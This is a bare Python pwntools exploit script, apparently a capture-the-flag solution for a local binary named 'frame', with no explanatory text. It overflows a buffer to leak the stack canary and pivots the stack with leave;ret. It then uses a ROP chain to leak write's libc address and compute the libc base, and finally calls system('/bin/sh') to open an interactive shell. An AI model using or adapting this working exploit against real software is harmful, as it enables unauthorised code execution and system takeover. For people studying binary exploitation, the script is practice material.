#coding=utf-8
from pwn import *
context(arch = 'amd64', os = 'linux')
sh = process("./frame")
pwn = ELF("./frame")
write_got = pwn.got["write"]
write_plt = pwn.plt["write"]
main = pwn.symbols["main"]
pop_rdi_ret = 0x4012db
pop_rdx_rsi_ret = 0x40118c
leave_ret = 0x40125f

sh.recvuntil(':')
buf_addr = int(sh.recvuntil('\n', drop=True), 16)
sh.sendafter('>', 'a'*0x59)
sh.recvuntil('a'*0x59)
canary = u64('\x00' + sh.recv(7))
log.info("canary: 0x%x" % canary)

payload = flat(['a'*8, pop_rdi_ret, 1, pop_rdx_rsi_ret, 8, write_got, write_plt, main, 'a'*(0x58-64), canary, buf_addr, leave_ret])
sh.sendafter('>', payload)
write_addr = u64(sh.recvuntil("\x00Don't", drop=True)[-7:].ljust(8,'\x00'))
sh.recvuntil(':')
buf_addr = int(sh.recvuntil('\n', drop=True), 16)
log.info("write address: 0x%x" % write_addr)
libc_base = write_addr - 0xf72b0
log.info("libc address: 0x%x" % libc_base)

system = libc_base + 0x45390
bin_sh = libc_base + 0x18cd57
sh.sendafter('>', 'a')
payload = flat(['a'*8, pop_rdi_ret, bin_sh, system, 'a'*(0x58-32), canary, buf_addr, leave_ret])
sh.sendafter('>', payload)
sh.interactive()
